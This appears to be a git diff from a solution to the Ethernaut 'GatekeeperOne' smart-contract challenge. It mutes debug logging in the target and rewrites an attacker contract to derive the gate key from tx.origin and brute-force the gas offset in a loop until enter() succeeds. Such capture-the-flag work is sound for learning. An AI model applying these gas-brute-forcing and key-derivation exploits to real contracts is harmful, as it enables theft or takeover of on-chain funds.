@@ -21,20 +21,20 @@ contract GatekeeperOne {
     }
 
     modifier gateThree(bytes8 _gateKey) {
-        console.log("in gateThree");
+        // console.log("in gateThree");
         require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
-        console.log("pass gateThree1");
+        // console.log("pass gateThree1");
         require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
-        console.log("pass gateThree2");
-        console.log("tx.origin: %s", tx.origin);
+        // console.log("pass gateThree2");
+        // console.log("tx.origin: %s", tx.origin);
         require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
-        console.log("pass gateThree");
+        // console.log("pass gateThree");
         _;
     }
 
     function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
         entrant = tx.origin;
-        console.log("succ!");
+        // console.log("succ!");
         return true;
     }
 }
@@ -46,8 +46,18 @@ contract GatekeeperBridge {
         gatekeeperone = GatekeeperOne(_gatekeeperone);
     }
 
-    function myCall(bytes8 _gateKey, uint256 _gas) external {
+    function myCall() external {
+        uint64 lastTwoBytesAsInt = uint64(uint16(uint160(tx.origin)));
+        uint64 gateKey = uint64(bytes8(hex"01020304000000")) + lastTwoBytesAsInt;
         // console.log("mycall tx.origin: %s, msg.sender: %s", tx.origin, msg.sender);
-        require(gatekeeperone.enter{gas: _gas}(_gateKey), "enter failed!");
+        for (uint256 gas1 = 0; gas1 < 8000; gas1++) {
+            try gatekeeperone.enter{gas: 8191 * 3 + gas1}(bytes8(gateKey)) {
+                console.log("target gas: %s", gas1);
+                break;
+            } catch (bytes memory reason) {
+                // console.log("revert reason: %s", string(reason));
+                continue;
+            }
+        }
     }
 }
